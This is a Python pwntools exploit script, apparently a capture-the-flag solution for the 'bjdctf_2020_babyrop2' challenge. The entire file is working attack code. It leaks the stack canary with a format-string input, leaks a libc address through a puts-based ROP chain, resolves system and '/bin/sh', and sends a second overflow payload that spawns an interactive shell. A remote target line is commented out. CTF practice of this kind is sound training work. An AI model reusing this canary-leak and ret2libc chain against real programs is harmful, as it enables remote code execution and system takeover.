from LibcSearcher import LibcSearcher
from pwn import *


def bjdctf_2020_babyrop2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babyrop2'):
    print('bjdctf_2020_babyrop2 start')
    target = process([file_name])
    # target = remote('node4.buuoj.cn', 28288)
    target_elf = ELF(file_name)

    vuln_addr = p64(target_elf.symbols['vuln'])
    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    pop_ret_gadget = p64(0x400993)  # pop rdi ; ret

    gdb.attach(target)
    target.sendlineafter("I'll give u some gift to help u!", '%7$p')
    target.recv()
    canary = int(target.recv(18), 16)
    print(hex(canary))

    payload_1 = b'a' * 24 + p64(canary) + b'a' * 8
    # puts(put_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # vuln()
    payload_1 += vuln_addr

    target.sendlineafter('Pull up your sword and tell me u story!', payload_1)
    print(target.recv())
    puts_addr = u64(target.recv(6).ljust(8, b'\x00'))
    print(hex(puts_addr))

    searcher = LibcSearcher('puts', puts_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 24 + p64(canary) + b'a' * 8
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_addr + system_addr
    target.sendlineafter('Pull up your sword and tell me u story!', payload_2)
    target.interactive()
    print('bjdctf_2020_babyrop2 end')


if __name__ == '__main__':
    bjdctf_2020_babyrop2()
